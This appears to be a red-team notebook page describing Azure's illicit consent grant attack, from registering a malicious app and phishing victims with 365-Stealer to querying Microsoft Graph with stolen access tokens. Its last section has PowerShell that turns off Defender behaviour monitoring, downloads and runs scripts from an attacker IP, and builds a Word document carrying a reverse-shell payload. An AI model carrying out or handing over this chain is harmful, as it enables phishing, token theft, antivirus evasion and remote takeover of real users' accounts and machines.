# Illicit Consent Grant

## Attack path overview

Illicit consent Grant is the most common attack on Azure.

<figure><img src="../../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

## Methodology

* As an attacker, create a tenant (even using the free registration)
* &#x20;Use "App registration" to create a malicious App
* Send the link to a victim
* Victim grant consent to the app and an authorization response will be sent to the attacker app, containing an access token
* Attacker can use the access token to access any service on the target tenant, such as MSGraph

## Implementation

* Register a new app from Azure AD

note: Domain can also be an IP.

<figure><img src="../../../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

* Next, create a client secret and save it

<figure><img src="../../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

* Add API permission for MSGraph API

<figure><img src="../../../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

* Grant "Delegated Permission" to access the MSGraph using the target victim account and add User.ReadBasicAll (Low impact, no admin consent needed\*) permission

<figure><img src="../../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

> In case of already getting a foothold in the target tenant (eg compromised host), it is possible to verify the Consent Grant policy. Otherwise, it is not possible, we just have to blindly test it&#x20;

```powershell
# import AzureAD-Preview powershell module

Import-Module .\AzureADPreview.psd1

# check policy
(Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole

# if it returns ManagePermissionGrantsForSelf.microsoft-user-default-legacy, it means tha
# the user can grant consent to all apps
```

## Weaponize the App

> Diffenrent tools can be used to steal token :&#x20;
>
> * MDSEC o365-attack-toolkit
> * AlteredSec 365-Stealer **(just a POC, don't use that in PROD)**
>
>

### o365-attack-toolkit

TODO...

{% embed url="https://github.com/mdsecactivebreach/o365-attack-toolkit" %}

### 365-Stealer

{% embed url="https://github.com/AlteredSecurity/365-Stealer" %}

* clone the tool
* copy the directory into a the web server root (htdocs for windows)&#x20;



```powershell
cp APPFOLDER C:\xampp\htdocs\
```

* start Apache and browse into the 365-Stealer page

<figure><img src="../../../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

* configure the tool using the "Registered App" ClientID and Secret and the Redirect URI

note: use the following place to retrieve the APP id ...

![](<../../../../../.gitbook/assets/image (3).png>)

<figure><img src="../../../../../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

* Start 365-Stealer and retrieve the Phishing link

<figure><img src="../../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

* Send the malicious link to the victim

<figure><img src="../../../../../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

> Reminder about the different parameters

<figure><img src="../../../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>



* Enumerate potential subdomains on the target , eg upload files etc .Send the malicious link to the victim

```powershell
import-module C:\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1
Invoke-EnumerateAzureSubDomains  -Base TARGET -Verbose
```

* retrieve the token

<figure><img src="../../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../../.gitbook/assets/image (15).png" alt=""><figcaption><p>Access Token !</p></figcaption></figure>

* decoding the token

<figure><img src="../../../../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

* use the token and make queries on MSGraph

```powershell
$token = "<Stolen Token>"
$URI = 'https://graph.microsoft.com/v1.0/users'
$RequestParams = @{
Method = 'GET'
Uri = $URI
Headers = @{
'Authorization' = "Bearer $Token"
}
}
(Invoke-RestMethod @RequestParams).value
```

> Note: The malicious Registered App has now been added to the target Tenant, under Enterprise Applications



> ![](<../../../../../.gitbook/assets/image (1) (1) (1).png>)

<figure><img src="../../../../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

### Target a higher privilege account

* search for an admin cloud user as a target
* Modify the application and add the following rights to be able to access and take control

![](<../../../../../.gitbook/assets/image (2) (1).png>)

* Regenerate a phishing link and send it to the target email retrieve from the previous steps



```powershell
// Generate a Word document from an another machine just as POC :)

PS C:\Windows\system32> $pass = ConvertTo-SecureString "PASSWORD" -AsPlainText -Force
PS C:\Windows\system32> $creds = New-Object System.Management.Automation.PSCredential ("HOST-vm\Administrator",$pass)
PS C:\Windows\system32> $officevm = New-PSSession -ComputerName IP -Credential $creds


PS C:\Windows\system32> Enter-PSSession -Session $officevm
[]: PS C:\Users\Administrator\Documents> Set-MpPreference -DisableBehaviorMonitoring $true
[]: PS C:\Users\Administrator\Documents> exit
PS C:\Windows\system32> Set-MpPreference -DisableBehaviorMonitoring $true
PS C:\Windows\system32> Enter-PSSession -Session $officevm


[]: PS C:\Users\Administrator\Documents> iex (New-Object Net.Webclient).downloadstring("http://IP:PORT/Out-Word.ps1")

[]: PS C:\Users\Administrator\Documents> Out-Word -Payload "powershell iex (New-Object Net.Webclient).downloadstring('http://IP:PORT/InvokePowerShellTcp.ps1');Power -Reverse -IPAddress IP -Port 4444" -OutputFile file.doc
Saved to file file.doc

## Copy remotely
 Copy-Item -FromSession $officevm -Path C:\Users\Administrator\Documents\file.doc -Destination .
```
